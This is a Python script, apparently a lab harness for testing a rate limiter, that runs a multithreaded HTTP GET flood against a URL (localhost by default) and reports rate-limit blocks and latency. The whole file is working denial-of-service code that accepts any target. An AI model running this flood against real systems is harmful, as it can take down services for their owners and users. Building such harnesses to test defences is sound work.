"""
HTTP Flood Attack (Layer 7)
Sends a massive number of HTTP GET requests using a thread pool.
Collects per-request latency and status codes.
"""

import threading
import time
import requests
from dataclasses import dataclass, field
from typing import List


@dataclass
class FloodResult:
    successes: int = 0       # HTTP 2xx
    rate_limited: int = 0    # HTTP 429 (rate limiter blocked the request)
    failures: int = 0        # HTTP 5xx or connection error
    latencies: List[float] = field(default_factory=list)
    start_time: float = 0.0
    end_time: float = 0.0

    @property
    def total(self) -> int:
        return self.successes + self.rate_limited + self.failures

    @property
    def success_rate(self) -> float:
        """Percentage of requests actually served (2xx only)."""
        return self.successes / self.total * 100 if self.total > 0 else 0.0

    @property
    def block_rate(self) -> float:
        """Percentage of requests blocked by rate limiting."""
        return self.rate_limited / self.total * 100 if self.total > 0 else 0.0

    @property
    def avg_latency(self) -> float:
        return sum(self.latencies) / len(self.latencies) if self.latencies else 0.0

    @property
    def p95_latency(self) -> float:
        if not self.latencies:
            return 0.0
        sorted_lat = sorted(self.latencies)
        idx = int(len(sorted_lat) * 0.95)
        return sorted_lat[idx]

    @property
    def requests_per_second(self) -> float:
        duration = self.end_time - self.start_time
        return self.total / duration if duration > 0 else 0.0


def _worker(url: str, duration: float, result: FloodResult, lock: threading.Lock, stop_event: threading.Event):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            t0 = time.perf_counter()
            resp = session.get(url, timeout=5)
            latency = time.perf_counter() - t0
            with lock:
                if resp.status_code == 429:
                    result.rate_limited += 1
                elif resp.status_code < 500:
                    result.successes += 1
                else:
                    result.failures += 1
                result.latencies.append(latency)
        except Exception:
            with lock:
                result.failures += 1


def run(target_url: str, num_threads: int = 100, duration: float = 30.0) -> FloodResult:
    result = FloodResult()
    lock = threading.Lock()
    stop_event = threading.Event()

    threads = [
        threading.Thread(target=_worker, args=(target_url, duration, result, lock, stop_event), daemon=True)
        for _ in range(num_threads)
    ]

    result.start_time = time.time()
    for t in threads:
        t.start()

    time.sleep(duration)
    stop_event.set()
    result.end_time = time.time()

    for t in threads:
        t.join(timeout=2)

    return result


if __name__ == "__main__":
    import sys

    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000/"
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 100
    dur = float(sys.argv[3]) if len(sys.argv) > 3 else 15.0

    print(f"HTTP Flood → {url}  threads={threads}  duration={dur}s")
    r = run(url, threads, dur)
    print(f"  Total requests : {r.total}")
    print(f"  Success (2xx)  : {r.successes} ({r.success_rate:.1f}%)")
    print(f"  Rate limited   : {r.rate_limited} ({r.block_rate:.1f}%)")
    print(f"  Failures (5xx) : {r.failures}")
    print(f"  Req/s          : {r.requests_per_second:.1f}")
    print(f"  Avg latency    : {r.avg_latency*1000:.1f} ms")
    print(f"  P95 latency    : {r.p95_latency*1000:.1f} ms")
